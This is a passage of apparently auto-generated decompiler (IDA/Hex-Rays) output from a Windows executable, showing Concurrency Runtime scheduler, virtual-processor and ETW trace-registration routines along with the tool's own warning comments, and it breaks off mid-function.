// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F153E04) ----------------------------------------------------
__int64 __fastcall sub_13F153E04(_BYTE *a1)
{
  a1[84] = 1;
  sub_13F153D88((__int64)a1);
  return (*(__int64 (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 24i64))(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F153E34) ----------------------------------------------------
unsigned __int64 *__fastcall sub_13F153E34(unsigned __int64 *a1)
{
  __int64 v2; // rbx
  __int64 v3; // rcx
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax

  v2 = MEMORY[0x76F85AE0](L"advapi32.dll", 0i64, 2048i64);
  if ( v2 || (unsigned int)MEMORY[0x76F91760]() == 87 && (v2 = MEMORY[0x76F86420](L"advapi32.dll")) != 0 )
  {
    v3 = MEMORY[0x76F92020](v2, "RegisterTraceGuidsW");
    *a1 = sub_13F142890(v3);
    v4 = MEMORY[0x76F92020](v2, "UnregisterTraceGuids");
    a1[1] = sub_13F142890(v4);
    v5 = MEMORY[0x76F92020](v2, "TraceEvent");
    a1[2] = sub_13F142890(v5);
    v6 = MEMORY[0x76F92020](v2, "GetTraceLoggerHandle");
    a1[3] = sub_13F142890(v6);
    v7 = MEMORY[0x76F92020](v2, "GetTraceEnableLevel");
    a1[4] = sub_13F142890(v7);
    v8 = MEMORY[0x76F92020](v2, "GetTraceEnableFlags");
    a1[5] = sub_13F142890(v8);
  }
  return a1;
}
// 13F18B7B8: using guessed type wchar_t aAdvapi32Dll[13];

//----- (000000013F153F54) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F153F54(int a1, __int64 a2, __int64 a3, __int64 a4)
{
  int v4; // ecx
  __int64 result; // rax
  char v6; // bl
  int v7; // eax

  v4 = a1 - 4;
  if ( v4 )
  {
    if ( v4 != 1 )
      return 87i64;
    qword_13F1C5EC0 = 0i64;
    byte_13F1C5EBC = 0;
    dword_13F1C5EB8 = 0;
  }
  else
  {
    qword_13F1C5EC0 = sub_13F1540B4(0i64, a4);
    MEMORY[0x76F91780](0i64);
    v6 = sub_13F154068(0i64, 0i64);
    if ( !v6 )
    {
      result = MEMORY[0x76F91760]();
      if ( (_DWORD)result )
        return result;
      v6 = 4;
    }
    v7 = sub_13F15401C(0i64, 0i64);
    if ( !v7 )
    {
      result = MEMORY[0x76F91760]();
      if ( (_DWORD)result )
        return result;
      v7 = -1;
    }
    dword_13F1C5EB8 = v7;
    byte_13F1C5EBC = v6;
  }
  return 0i64;
}
// 13F153F6E: write access to const memory at 13F1C5EC0 has been detected
// 13F153F76: write access to const memory at 13F1C5EBC has been detected
// 13F153F7D: write access to const memory at 13F1C5EB8 has been detected
// 13F153F9B: write access to const memory at 13F1C5EC0 has been detected
// 13F154005: write access to const memory at 13F1C5EB8 has been detected
// 13F15400B: write access to const memory at 13F1C5EBC has been detected
// 13F153FAD: control flows out of bounds to 76F91760
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F1C5EC0: using guessed type __int64 qword_13F1C5EC0;

//----- (000000013F15401C) ----------------------------------------------------
__int64 __fastcall sub_13F15401C(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall *v4)(__int64); // rax

  v2 = *(_QWORD *)(a1 + 40);
  if ( v2 == MEMORY[0x771C0850](0i64) )
  {
    MEMORY[0x76F91780](127i64);
    return 0i64;
  }
  else
  {
    v4 = (__int64 (__fastcall *)(__int64))sub_13F142890(v2);
    return v4(a2);
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154068) ----------------------------------------------------
char __fastcall sub_13F154068(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall *v4)(__int64); // rax

  v2 = *(_QWORD *)(a1 + 32);
  if ( v2 == MEMORY[0x771C0850](0i64) )
  {
    MEMORY[0x76F91780](127i64);
    return 0;
  }
  else
  {
    v4 = (__int64 (__fastcall *)(__int64))sub_13F142890(v2);
    return v4(a2);
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1540B4) ----------------------------------------------------
__int64 __fastcall sub_13F1540B4(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall *v4)(__int64); // rax

  v2 = *(_QWORD *)(a1 + 24);
  if ( v2 == MEMORY[0x771C0850](0i64) )
  {
    MEMORY[0x76F91780](127i64);
    return -1i64;
  }
  else
  {
    v4 = (__int64 (__fastcall *)(__int64))sub_13F142890(v2);
    return v4(a2);
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154100) ----------------------------------------------------
__int64 __fastcall sub_13F154100(__int64 *a1, __int64 a2, __int64 a3, unsigned int a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbx
  __int64 (__fastcall *v10)(__int64, _QWORD, __int64, _QWORD, __int64, _QWORD, _QWORD, __int64); // rax

  v6 = *a1;
  if ( v6 == MEMORY[0x771C0850](0i64) )
    return 127i64;
  v10 = (__int64 (__fastcall *)(__int64, _QWORD, __int64, _QWORD, __int64, _QWORD, _QWORD, __int64))sub_13F142890(v6);
  return v10(a2, 0i64, a3, a4, a5, 0i64, 0i64, a6);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154188) ----------------------------------------------------
__int64 __fastcall sub_13F154188(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 (__fastcall *v6)(__int64, __int64); // rax

  v3 = *(_QWORD *)(a1 + 16);
  if ( v3 == MEMORY[0x771C0850](0i64) )
    return 127i64;
  v6 = (__int64 (__fastcall *)(__int64, __int64))sub_13F142890(v3);
  return v6(a2, a3);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1541DC) ----------------------------------------------------
__int64 __fastcall sub_13F1541DC(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 (__fastcall *v4)(__int64); // rax

  v2 = *(_QWORD *)(a1 + 8);
  if ( v2 == MEMORY[0x771C0850](0i64) )
    return 127i64;
  v4 = (__int64 (__fastcall *)(__int64))sub_13F142890(v2);
  return v4(a2);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154220) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F154220()
{
  unsigned __int64 *v0; // rax
  __int64 result; // rax
  char v2[8]; // [rsp+38h] [rbp-20h] BYREF
  int v3; // [rsp+40h] [rbp-18h]
  __int64 (__fastcall *v4)(); // [rsp+48h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DDC, 1) )
  {
    v3 = 0;
    v4 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v2);
    while ( _InterlockedExchange(&dword_13F1C5DDC, 1) );
  }
  v0 = (unsigned __int64 *)sub_13F14059C(48i64);
  if ( v0 )
    v0 = sub_13F153E34(v0);
  qword_13F1C5EC8 = (__int64)v0;
  result = sub_13F154100(
             (__int64 *)v0,
             (__int64)sub_13F153F54,
             (__int64)qword_13F18B698,
             7u,
             (__int64)qword_13F1B7270,
             (__int64)&qword_13F1C5EB0);
  dword_13F1C5DDC = 0;
  return result;
}
// 13F154293: write access to const memory at 13F1C5EC8 has been detected
// 13F1542CF: write access to const memory at 13F1C5DDC has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F18B698: using guessed type __int64 qword_13F18B698[4];
// 13F1B7270: using guessed type __int64 qword_13F1B7270[2];
// 13F1C5DDC: using guessed type int dword_13F1C5DDC;
// 13F1C5EB0: using guessed type __int64 qword_13F1C5EB0;
// 13F1C5EC8: using guessed type __int64 qword_13F1C5EC8;
// 13F154220: using guessed type char var_20[8];

//----- (000000013F1542E0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F1542E0()
{
  ;
}
// 13F1542F7: write access to const memory at 13F1C5EBC has been detected
// 13F1542FE: write access to const memory at 13F1C5EB8 has been detected
// 13F15431E: write access to const memory at 13F1C5EC8 has been detected
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1C5EB0: using guessed type __int64 qword_13F1C5EB0;
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F1C5EC8: using guessed type __int64 qword_13F1C5EC8;

//----- (000000013F15432C) ----------------------------------------------------
__int64 __fastcall sub_13F15432C(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx
  __int64 v4; // rax
  __int64 v5; // rcx
  __int64 v6; // rdx
  __int64 v7; // rcx

  *(_DWORD *)a1 = 0;
  *(_DWORD *)(a1 + 4) = 0;
  *(_QWORD *)(a1 + 32) = a2;
  *(_DWORD *)(a1 + 8) = 63;
  *(_QWORD *)(a1 + 16) = sub_13F1790C4(512i64, a2);
  v4 = sub_13F1790C4(1024i64, v3);
  if ( v4 )
  {
    v5 = v4;
    v6 = 64i64;
    do
    {
      *(_QWORD *)v5 = 0i64;
      *(_DWORD *)(v5 + 8) = 0;
      v5 += 16i64;
      --v6;
    }
    while ( v6 );
  }
  v7 = *(_QWORD *)(a1 + 16);
  *(_QWORD *)(a1 + 24) = v4;
  sub_13F15EF70(v7, 0, 0x200ui64);
  return a1;
}
// 13F154360: variable 'v3' is possibly undefined
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F1543A8) ----------------------------------------------------
__int64 __fastcall sub_13F1543A8(__int64 a1)
{
  _DWORD *v1; // rbx

  v1 = (_DWORD *)(a1 + 200);
  *(_QWORD *)a1 = &Concurrency::details::VirtualProcessor::`vftable';
  sub_13F15432C(a1 + 24, a1 + 200);
  *(_QWORD *)(a1 + 64) = 0i64;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  *v1 = 0;
  *(_QWORD *)(a1 + 216) = 0i64;
  *(_QWORD *)(a1 + 224) = 0i64;
  *(_QWORD *)(a1 + 232) = 0i64;
  *(_DWORD *)(a1 + 240) = 0;
  *(_QWORD *)(a1 + 248) = 0i64;
  *(_DWORD *)(a1 + 304) = 0;
  return a1;
}
// 13F18B890: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (000000013F15441C) ----------------------------------------------------
__int64 __fastcall sub_13F15441C(_QWORD *a1, __int64 a2)
{
  __int64 v3; // rcx
  __int64 v4; // rdx
  __int64 v5; // rdx

  *a1 = &Concurrency::details::VirtualProcessor::`vftable';
  v3 = a1[18];
  if ( v3 )
  {
    sub_13F14BAE0(v3);
    a1[18] = 0i64;
  }
  sub_13F14088C(a1[31], a2);
  sub_13F14088C(a1[5], v4);
  return sub_13F14088C(a1[6], v5);
}
// 13F154459: variable 'a2' is possibly undefined
// 13F154463: variable 'v4' is possibly undefined
// 13F154472: variable 'v5' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B890: using guessed type void *Concurrency::details::VirtualProcessor::`vftable';

//----- (000000013F154478) ----------------------------------------------------
_QWORD *__fastcall sub_13F154478(_QWORD *a1, __int64 a2)
{
  char v2; // bl

  v2 = a2;
  sub_13F15441C(a1, a2);
  if ( (v2 & 1) != 0 )
    sub_13F14088C(a1, 368i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1544AC) ----------------------------------------------------
__int64 __fastcall sub_13F1544AC(__int64 a1, _BYTE *a2)
{
  __int64 result; // rax

  if ( a2 )
  {
    sub_13F157088((__int64)a2);
    result = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)a2 + 56i64))(a2, a1);
  }
  *(_QWORD *)(a1 + 184) = a2;
  if ( a2 )
  {
    if ( (a2[295] & 1) != 0 )
    {
      ++*(_DWORD *)(a1 + 164);
      a2[295] &= ~1u;
    }
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15450C) ----------------------------------------------------
bool __fastcall sub_13F15450C(__int64 a1)
{
  __int64 v2; // rax
  unsigned __int64 v3; // rdx
  char v4; // cl
  unsigned __int64 v5; // rdx
  __int64 v6; // r8
  bool v7; // r9

  if ( *(_BYTE *)(a1 + 154) )
  {
    *(_BYTE *)(a1 + 154) = 0;
    return 1;
  }
  else
  {
    v2 = *(_QWORD *)(a1 + 120);
    v3 = *(unsigned int *)(a1 + 212);
    v4 = v3 & 0x1F;
    v5 = v3 >> 5;
    v6 = *(_QWORD *)(*(_QWORD *)v2 + 152i64);
    v7 = ((1 << v4) & *(_DWORD *)(v6 + 4 * v5)) != 0;
    if ( ((1 << v4) & *(_DWORD *)(v6 + 4 * v5)) != 0 )
      _InterlockedAnd((volatile signed __int32 *)(v6 + 4 * v5), ~(1 << v4));
    return v7;
  }
}

//----- (000000013F154560) ----------------------------------------------------
char __fastcall sub_13F154560(__int64 a1)
{
  char result; // al
  _QWORD *v3; // rdi
  __int64 (__fastcall ***v4)(_QWORD, __int64); // rcx

  result = sub_13F14A2E4(*(_QWORD *)(a1 + 72));
  if ( !result )
  {
    v3 = *(_QWORD **)(a1 + 32);
    while ( v3 )
    {
      v4 = (__int64 (__fastcall ***)(_QWORD, __int64))(v3 - 36);
      v3 = (_QWORD *)*v3;
      if ( v4 )
        result = (**v4)(v4, 1i64);
    }
    *(_QWORD *)(a1 + 32) = 0i64;
    _InterlockedExchange((volatile __int32 *)(a1 + 120), 0);
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1545CC) ----------------------------------------------------
char __fastcall sub_13F1545CC(__int64 a1, __int64 a2, int a3, char a4)
{
  signed __int32 v4; // er10
  bool v5; // al
  bool v6; // zf
  signed __int32 v7; // eax
  char result; // al

  v4 = *(_DWORD *)(a1 + 16);
  if ( (v4 & a3) == 0 )
    return 0;
  if ( a3 == 15 )
  {
    v4 = _InterlockedExchange((volatile __int32 *)(a1 + 16), 0);
    v5 = v4 != 0;
  }
  else
  {
    while ( 1 )
    {
      v7 = _InterlockedCompareExchange((volatile signed __int32 *)(a1 + 16), 0, v4);
      v6 = v4 == v7;
      v4 = v7;
      if ( v6 )
        break;
      if ( (v7 & a3) == 0 )
        return 0;
    }
    v5 = 1;
  }
  if ( !v5 )
    return 0;
  if ( a4 )
  {
    _InterlockedDecrement((volatile signed __int32 *)(**(_QWORD **)(a1 + 120) + 676i64));
    _InterlockedDecrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 120) + 48i64));
    if ( ((v4 - 4) & 0xFFFFFFFB) == 0 )
    {
      _InterlockedDecrement((volatile signed __int32 *)(**(_QWORD **)(a1 + 120) + 680i64));
      _InterlockedDecrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 120) + 52i64));
    }
  }
  *(_DWORD *)a2 = v4;
  result = 1;
  *(_QWORD *)(a2 + 8) = a1;
  *(_DWORD *)(a1 + 20) = v4;
  return result;
}

//----- (000000013F154664) ----------------------------------------------------
__int64 __fastcall sub_13F154664(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 136) + 48i64))(*(_QWORD *)(a1 + 136));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F15467C) ----------------------------------------------------
__int64 __fastcall sub_13F15467C(__int64 a1)
{
  return (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(a1 + 136) + 56i64))(*(_QWORD *)(a1 + 136));
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154694) ----------------------------------------------------
char __fastcall sub_13F154694(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  volatile signed __int32 **v4; // rax
  __int32 v7; // er14
  volatile signed __int32 *v9; // rsi

  v4 = *(volatile signed __int32 ***)(a1 + 120);
  v7 = a2;
  v9 = *v4;
  if ( (_DWORD)a2 == 1 || (_DWORD)a2 == 4 )
  {
    LOBYTE(a2) = 1;
    if ( sub_13F14C594(*v4, a2) )
    {
      if ( !a3 )
        a3 = sub_13F149AC8((__int64)v9);
      return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 56i64))(a1, a3, a4);
    }
    else
    {
      if ( a4 )
        sub_13F14B404((__int64)v9, a4, 1);
      sub_13F154B48(a1, v7, 0);
      return 0;
    }
  }
  else
  {
    (*(void (__fastcall **)(_QWORD, _QWORD))(**(_QWORD **)(a1 + 136) + 40i64))(
      *(_QWORD *)(a1 + 136),
      *(_QWORD *)(a1 + 192));
    return 1;
  }
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154764) ----------------------------------------------------
char __fastcall sub_13F154764(unsigned int *a1, __int64 a2)
{
  char result; // al
  __int64 v4; // rdx

  result = 0;
  v4 = *a1;
  if ( (_DWORD)v4 )
  {
    result = sub_13F154694(
               *((_QWORD *)a1 + 1),
               v4,
               *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(*((_QWORD *)a1 + 1) + 120i64) + 8i64) + 16i64),
               a2);
    *a1 = 0;
  }
  return result;
}

//----- (000000013F154798) ----------------------------------------------------
__int64 __fastcall sub_13F154798(__int64 a1)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 144);
  if ( !result )
  {
    result = sub_13F14A0BC(0);
    *(_QWORD *)(a1 + 144) = result;
  }
  return result;
}

//----- (000000013F1547C4) ----------------------------------------------------
__int64 __fastcall sub_13F1547C4(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 *v5; // rax
  __int64 v6; // rsi
  int v7; // eax
  __int64 v8; // rdx
  __int64 v9; // rcx
  int v10; // eax
  int v11; // eax
  __int64 v12; // rax
  __int64 v13; // rbx
  char v15[32]; // [rsp+30h] [rbp-38h] BYREF
  int v16; // [rsp+70h] [rbp+8h] BYREF
  int v17; // [rsp+78h] [rbp+10h] BYREF

  *(_QWORD *)(a1 + 120) = a2;
  *(_QWORD *)(a1 + 312) = 0i64;
  v3 = a3;
  *(_QWORD *)(a1 + 176) = 0i64;
  *(_DWORD *)(a1 + 352) = 1;
  *(_DWORD *)(a1 + 328) = 1;
  *(_QWORD *)(a1 + 128) = *(_QWORD *)(a2 + 8);
  v5 = *(__int64 **)(a1 + 120);
  *(_QWORD *)(a1 + 136) = a3;
  *(_WORD *)(a1 + 256) = 0;
  *(_DWORD *)(a1 + 16) = 0;
  *(_QWORD *)(a1 + 160) = 0i64;
  *(_QWORD *)(a1 + 168) = 0i64;
  *(_QWORD *)(a1 + 184) = 0i64;
  *(_QWORD *)(a1 + 264) = 0i64;
  *(_DWORD *)(a1 + 304) = 0;
  *(_QWORD *)(a1 + 144) = 0i64;
  *(_WORD *)(a1 + 152) = 0;
  *(_BYTE *)(a1 + 154) = 1;
  v6 = *v5;
  *(_DWORD *)(a1 + 204) = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3 + 32i64))(a3);
  v7 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v3 + 8i64))(v3);
  *(_DWORD *)(a1 + 208) = v7;
  v16 = v7;
  sub_13F149520((int *)(v6 + 584), &v16, &v17);
  *(_DWORD *)(a1 + 212) = v17;
  v10 = sub_13F1454C8(v9, v8);
  sub_13F14A198(a1 + 240, v10);
  sub_13F1552A0(a1 + 240);
  *(_DWORD *)(*(_QWORD *)(a1 + 248) + 4 * ((unsigned __int64)*(unsigned int *)(a1 + 212) >> 5)) |= 1 << (*(_DWORD *)(a1 + 212) & 0x1F);
  sub_13F15C7A8(a1 + 64, a1, (*(_DWORD *)(v6 + 20) != 0) + 1);
  v11 = (*(__int64 (__fastcall **)(_QWORD))(***(_QWORD ***)(a1 + 120) + 8i64))(**(_QWORD **)(a1 + 120));
  v12 = sub_13F15BED8((__int64)v15, 3, *(_DWORD *)(a1 + 208), v11, a1);
  *(_DWORD *)(a1 + 216) ^= (*(_DWORD *)v12 ^ *(_DWORD *)(a1 + 216)) & 0xFFFFFFF;
  *(_DWORD *)(a1 + 216) = *(_DWORD *)v12 ^ (*(_DWORD *)v12 ^ *(_DWORD *)(a1 + 216)) & 0xFFFFFFF;
  *(_QWORD *)(a1 + 224) = *(_QWORD *)(v12 + 8);
  *(_DWORD *)(a1 + 220) = *(_DWORD *)(v12 + 4);
  *(_QWORD *)(a1 + 232) = *(_QWORD *)(v12 + 16);
  LODWORD(v3) = *(_DWORD *)(a1 + 212);
  sub_13F154AAC(v6 + 120, v3);
  v13 = (unsigned int)(16 * v3);
  if ( *(_QWORD *)(*(_QWORD *)(v6 + 160) + 8 * v13) == 1i64 )
    _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)(v6 + 160) + 8 * v13), 0i64, 1i64);
  return (*(__int64 (__fastcall **)(_QWORD, _QWORD))(***(_QWORD ***)(a1 + 120) + 8i64))(
           **(_QWORD **)(a1 + 120),
           (unsigned int)v13);
}
// 13F1549E8: conditional instruction was optimized away because bp.1==0
// 13F1548B3: variable 'v9' is possibly undefined
// 13F1548B3: variable 'v8' is possibly undefined
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;
// 13F1547C4: using guessed type char var_38[32];

//----- (000000013F154A10) ----------------------------------------------------
__int64 __fastcall sub_13F154A10(__int64 a1, unsigned int a2)
{
  unsigned __int32 v3; // esi
  __int64 v4; // r14
  unsigned __int64 v5; // rbx
  int v6; // edi
  char v8[8]; // [rsp+20h] [rbp-28h] BYREF
  int v9; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v10)(); // [rsp+30h] [rbp-18h]

  v3 = _InterlockedDecrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 16) + 4i64 * a2));
  if ( !v3 )
  {
    v4 = *(_QWORD *)(a1 + 8);
    v5 = (unsigned __int64)a2 >> 5;
    v6 = 1 << (a2 & 0x1F);
    if ( (*(_DWORD *)(v4 + 4 * v5) & v6) == 0 )
    {
      v9 = 0;
      v10 = sub_13F142C2C;
      while ( (*(_DWORD *)(v4 + 4 * v5) & v6) == 0 )
        sub_13F141BF4((__int64)v8);
    }
    _InterlockedAnd((volatile signed __int32 *)(*(_QWORD *)(a1 + 8) + 4 * v5), ~v6);
  }
  return v3;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F154A10: using guessed type char var_28[8];

//----- (000000013F154AAC) ----------------------------------------------------
__int64 __fastcall sub_13F154AAC(__int64 a1, unsigned int a2)
{
  unsigned __int32 v3; // esi
  __int64 v4; // r14
  unsigned __int64 v5; // rbx
  unsigned int v6; // edi
  char v8[8]; // [rsp+20h] [rbp-28h] BYREF
  int v9; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v10)(); // [rsp+30h] [rbp-18h]

  v3 = _InterlockedIncrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 16) + 4i64 * a2));
  if ( v3 == 1 )
  {
    v4 = *(_QWORD *)(a1 + 8);
    v5 = (unsigned __int64)a2 >> 5;
    v6 = 1 << (a2 & 0x1F);
    if ( (*(_DWORD *)(v4 + 4 * v5) & v6) != 0 )
    {
      v9 = 0;
      v10 = sub_13F142C2C;
      while ( (*(_DWORD *)(v4 + 4 * v5) & v6) != 0 )
        sub_13F141BF4((__int64)v8);
    }
    _InterlockedOr((volatile signed __int32 *)(*(_QWORD *)(a1 + 8) + 4 * v5), v6);
  }
  return v3;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F154AAC: using guessed type char var_28[8];

//----- (000000013F154B48) ----------------------------------------------------
__int64 __fastcall sub_13F154B48(__int64 a1, __int32 a2, char a3)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + 192) = *(_QWORD *)(a1 + 184);
  if ( a3 && (a2 == 1 || a2 == 4) )
    sub_13F14C594(**(volatile signed __int32 ***)(a1 + 120), 0i64);
  _InterlockedIncrement((volatile signed __int32 *)(**(_QWORD **)(a1 + 120) + 676i64));
  _InterlockedIncrement((volatile signed __int32 *)(*(_QWORD *)(a1 + 120) + 48i64));
  result = (unsigned int)(a2 - 4);
  if ( (result & 0xFFFFFFFB) == 0 )
  {
    _InterlockedIncrement((volatile signed __int32 *)(**(_QWORD **)(a1 + 120) + 680i64));
    result = *(_QWORD *)(a1 + 120);
    _InterlockedIncrement((volatile signed __int32 *)(result + 52));
  }
  _InterlockedExchange((volatile __int32 *)(a1 + 16), a2);
  return result;
}

//----- (000000013F154BC8) ----------------------------------------------------
char __fastcall sub_13F154BC8(_BYTE *a1)
{
  char result; // al
  __int64 v3; // rdx
  __int64 v5; // rcx
  unsigned int v6; // [rsp+20h] [rbp-18h] BYREF
  __int64 v7; // [rsp+28h] [rbp-10h]

  v6 = 0;
  result = sub_13F1545CC((__int64)a1, (__int64)&v6, 15, 1);
  if ( result )
  {
    v3 = v6;
    if ( v6 == 2 || v6 == 8 )
    {
      v5 = v7;
      a1[257] = 1;
      return sub_13F154694(v5, v3, 0i64, 0i64);
    }
    else
    {
      return (*(__int64 (__fastcall **)(_BYTE *))(*(_QWORD *)a1 + 24i64))(a1);
    }
  }
  else
  {
    a1[257] = 1;
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154C44) ----------------------------------------------------
signed __int64 __fastcall sub_13F154C44(__int64 a1)
{
  __int64 v2; // rcx
  __int64 v3; // rax

  v2 = *(_QWORD *)(**(_QWORD **)(a1 + 120) + 664i64);
  v3 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v2 + 40i64))(v2, *(_QWORD *)(a1 + 136));
  return sub_13F1556DC(*(volatile signed __int32 ***)(a1 + 120), v3, 1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F154C84) ----------------------------------------------------
__int64 __fastcall sub_13F154C84(__int64 a1)
{
  int v1; // er8
  __int64 v2; // rax
  unsigned __int64 v3; // rdx
  __int64 v4; // r9
  unsigned int *v5; // r8
  __int64 v6; // r10
  __int64 v7; // r8

  v1 = *(_DWORD *)(a1 + 4) - 1;
  v2 = *(_QWORD *)(a1 + 16);
  v3 = v1 & (unsigned __int64)*(int *)(a1 + 8);
  *(_DWORD *)(a1 + 4) = v1;
  v4 = _InterlockedExchange64((volatile __int64 *)(v2 + 8 * v3), 0i64);
  if ( !v4 )
    *(_DWORD *)(a1 + 4) = v1 + 1;
  if ( (v4 & 1) == 0 )
    return v4;
  v4 &= ~1ui64;
  v5 = (unsigned int *)(*(_QWORD *)(a1 + 24) + 16 * (v1 & (unsigned __int64)*(int *)(a1 + 8)));
  v6 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)v5 + 24i64) + 8i64 * v5[2]);
  if ( v6 != 1
    && _InterlockedExchange64((volatile __int64 *)(*(_QWORD *)(*(_QWORD *)v5 + 24i64) + 8i64 * v5[2]), 1i64) == v6 )
  {
    return v4;
  }
  v7 = *(_QWORD *)v5;
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v7 + 36), 0xFFFFFFFF) == 1 )
    sub_13F14AA74(
      (__int64 (__fastcall **)(__int64))(v7 + 48),
      (__int64 (__fastcall *)(__int64))sub_13F14EF30,
      (__int64 (__fastcall *)(__int64))v7,
      *(_QWORD *)v7);
  return 1i64;
}

//----- (000000013F154D30) ----------------------------------------------------
char __fastcall sub_13F154D30(__int64 a1, signed __int64 a2, int a3, char a4)
{
  int v5; // er10
  int v7; // er11
  __int64 v8; // r8
  int v9; // er10
  __int64 v10; // r8
  __int64 v11; // rcx
  unsigned __int16 v12; // ax
  signed __int64 v13; // rdx
  __int64 v14; // rax
  __int64 v15; // r9

  v5 = a3 >> *(_DWORD *)(a1 + 84);
  v7 = a3 & (*(_DWORD *)(a1 + 80) - 1);
  if ( v5 >= *(_DWORD *)(a1 + 108) )
    return 0;
  v8 = *(_QWORD *)(a1 + 96);
  if ( v5 < *(_DWORD *)(a1 + 104) )
  {
    v10 = *(_QWORD *)(v8 + 8i64 * v5);
  }
  else
  {
    v9 = v5 - *(_DWORD *)(a1 + 104);
    v10 = *(_QWORD *)(v8 + 8i64 * *(int *)(a1 + 104) - 8);
    if ( v9 >= 0 )
    {
      v11 = (unsigned int)(v9 + 1);
      do
      {
        v10 = *(_QWORD *)(v10 + 8);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange64((volatile signed __int64 *)(*(_QWORD *)v10 + 8i64 * v7), 0i64, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 16), v7, -2);
  if ( a4 )
  {
    v12 = MEMORY[0x771A31E0](a1);
    v13 = a2 + 288;
    if ( v12 <= *(int *)(a1 + 116) )
    {
      MEMORY[0x771C4CC0](a1, v13);
    }
    else
    {
